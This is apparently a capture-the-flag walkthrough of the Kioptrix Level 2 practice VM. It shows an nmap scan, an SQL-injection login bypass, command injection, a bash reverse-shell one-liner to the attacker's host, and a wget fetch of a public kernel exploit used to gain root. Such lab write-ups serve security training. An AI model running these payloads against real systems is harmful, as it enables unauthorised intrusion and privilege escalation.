# Kioptrix Level 2
Insert `ethernet0.connectionType = "nat"` to .vmx, and change all `bridged` in the .vmx file of the VM before use VMware to open it.
![](https://i.imgur.com/NWG2WuI.png)
Host is `192.168.232.145`
![](https://i.imgur.com/YcIxsUG.png)
Victim is `192.168.232.147`
`nmap -sS -sV -p- -oN NampKioptrixLv2.txt 192.168.232.147`
![](https://i.imgur.com/QrFQ8Xd.png)
We got http service
![](https://i.imgur.com/bufhsOg.png)
Let's give it with simple SQLi
```php
stmt = "select * from user where username ='".$Name."' and password='".$Passwd."';"
```
account: `admin' or '1'='1`
password: `{WhateverJustTypeSomething}`
![](https://i.imgur.com/zCnoi9n.png)
Then you will see a web shell.
![](https://i.imgur.com/e4bctbZ.png)
Usually we need to find the way to command inject and locate where we are then create return shell.
First we try `;` semicolon
![](https://i.imgur.com/3D7e3YO.png)
![](https://i.imgur.com/OvTTInj.png)
Open a listener before shell return.
`nc -lvp 8888`
![](https://i.imgur.com/ocunQI6.png)
`;bash -i >&/dev/tcp/192.168.232.145/8888 0>&1`
![](https://i.imgur.com/s8ZxtP9.png)
Find the PoE [Linux Kernel 2.4/2.6 'sock_sendpage()' Ring0 Privilege Escalation](https://www.exploit-db.com/exploits/9479). Copy as file and launch a simple server.
`python -m SimpleHTTPServer 80`
![](https://i.imgur.com/dBQOCZh.png)
Then use return shell to get the C file and compile it.
`wget http://192.168.232.145/LinuxKernelPoC.c`
![](https://i.imgur.com/mErmrVt.png)
Permission Denied because we are in Web protect path, switch to else where.
![](https://i.imgur.com/8lqHItb.png)
After compiling, change mode and execute it.
Now we got the root.

